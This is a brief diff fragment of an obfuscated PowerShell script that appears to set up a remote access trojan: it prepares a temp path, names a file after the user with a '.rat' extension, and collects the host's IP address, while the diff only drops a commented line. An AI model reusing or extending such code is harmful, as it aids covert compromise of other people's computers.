@@ -30,7 +30,6 @@ $qsQBioVOkY = "$env:temp\$FrNAQBWSnJ"
 $NyZnoLKCIs = Get-Location
 $CRYnrkaDbe = "$env:UserName.rat"
 $PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
-# $AhdjktGyiZ = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
 $AhdjktGyiZ = (
     Get-NetIPConfiguration |
     Where-Object {
